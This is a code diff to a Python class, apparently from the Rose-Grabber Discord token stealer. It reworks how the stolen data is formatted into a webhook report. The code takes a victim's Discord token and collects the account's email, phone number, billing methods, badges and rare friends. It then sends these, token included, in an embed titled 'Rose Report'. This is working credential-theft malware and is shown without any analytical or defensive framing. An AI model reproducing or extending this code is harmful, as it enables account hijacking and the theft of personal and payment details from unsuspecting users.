@@ -1,9 +1,10 @@
 from json import loads, dumps
 from urllib.request import Request, urlopen
-from config import Config 
+from config import Config
 cc = Config()
 from ipinf import Info
 ifx = Info()
+from datetime import datetime
 
 class DiscordX(): #Updating soon
     def __init__(self):
@@ -118,15 +119,15 @@ class DiscordX(): #Updating soon
             return False
 
         if billingjson == []:
-            return "?"
+            return "`None`"
 
         billing = ""
         for methode in billingjson:
             if methode["invalid"] is False:
                 if methode["type"] == 1:
-                    billing += ":credit_card:"
+                    billing += "<:credit_card:1151916484176654416>"
                 elif methode["type"] == 2:
-                    billing += ":parking: "
+                    billing += "<:paypal:1151916071092244520> "
 
         return billing
 
@@ -228,7 +229,7 @@ class DiscordX(): #Updating soon
             elif nitrot == 2:
                 nitro = "<a:boost:824036778570416129> <:classic:896119171019067423> "
         if "phone" in userjson:
-            phone = f'```{userjson["phone"]}```'
+            phone = userjson["phone"]
 
         return username, hashtag, email, idd, pfp, flags, nitro, phone
 
@@ -263,7 +264,7 @@ class DiscordX(): #Updating soon
         username, hashtag, email, idd, pfp, flags, nitro, phone = self.GetTokenInfo(token)
 
         if pfp is None:
-            pfp = "https://cdn.discordapp.com/attachments/963114349877162004/992593184251183195/7c8f476123d28d103efe381543274c25.png"
+            pfp = "https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/components/assets/dogg.png"
         else:
             pfp = f"https://cdn.discordapp.com/avatars/{idd}/{pfp}"
 
@@ -271,50 +272,51 @@ class DiscordX(): #Updating soon
         badge = self.GetBadge(flags)
         friends = self.GetUHQFriends(token)
         if friends == "":
-            friends = "No Rare Friends"
+            friends = "`None`"
         if not billing:
             badge, phone, billing = "None", "None", "None"
         if nitro == "" and badge == "":
-            nitro = "?"
+            nitro = "`None`"
 
+        current_time_iso = datetime.now().isoformat()
         data = {
             "content":
             "",
             "embeds": [{
+                "title":
+                "Rose Report",
+                "description":
+                "Rose Instance - Token Information",
                 "color":
-                cc.eb_color,
+                cc.get_color(),
                 "fields": [
                     {
-                        "name": ":tickets:   -   Token:",
-                        "value": f"```{token}```",
+                        "name": "Token:",
+                        "value": f"||`{token}`||",
+                        "inline": False,
                     },
                     {
-                        "name": ":earth_asia:   -   Email:",
-                        "value": f"```{email}```",
-                        "inline": True,
+                        "name": "Email:",
+                        "value": f"`{email}`",
+                        "inline": False,
                     },
                     {
-                        "name": ":telephone_receiver:   -   Phone:",
-                        "value": f"{phone}",
-                        "inline": True,
+                        "name": "Phone:",
+                        "value": f"`{phone}`",
+                        "inline": False,
                     },
                     {
-                        "name": ":globe_with_meridians:   -   IP:",
-                        "value": f"```{ifx.get_public_ip()}```",
-                        "inline": True,
-                    },
-                    {
-                        "name": ":beginner:   -   Badges:",
+                        "name": "Badges:",
                         "value": f"{nitro}{badge}",
-                        "inline": True,
+                        "inline": False,
                     },
                     {
-                        "name": ":credit_card:   -   Billing:",
+                        "name": "Billing:",
                         "value": f"{billing}",
-                        "inline": True,
+                        "inline": False,
                     },
                     {
-                        "name": ":office:   -   Friends:",
+                        "name": "Friends:",
                         "value": f"{friends}",
                         "inline": False,
                     },
@@ -324,12 +326,13 @@ class DiscordX(): #Updating soon
                     "icon_url": f"{pfp}",
                 },
                 "footer": {
-                    "text": cc.eb_footer,
-                    "icon_url": "",
+                    "text": cc.get_footer(),
+                    "icon_url": cc.get_avatar(),
                 },
                 "thumbnail": {
                     "url": f"{pfp}"
                 },
+                "timestamp": current_time_iso,
             }],
             "avatar_url":
             cc.wh_avatar,
